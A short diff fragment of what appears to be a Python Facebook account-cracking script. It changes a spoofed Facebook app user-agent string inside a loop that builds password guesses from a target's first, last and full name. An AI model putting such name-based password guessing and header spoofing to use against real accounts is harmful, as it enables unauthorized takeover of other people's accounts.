@@ -252,7 +252,7 @@ def method():
 
         for pswd in pp:
 
-              heads= ('[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/U.S.Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920R4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]')#Put Your user Agent Here
+              heads=('[FBAN/Orca-Android;FBAV/115.0.0.27.214;FBBV/426817936;FBLC/en_GB;FBRV/428276664;FBCR/Nepal Telecom;FBMF/LGE;FBBD/lge;FBPN/com.facebook.orca;FBDV/LMK525;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1422};]')#Put Your user Agent Here
 
               pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
 
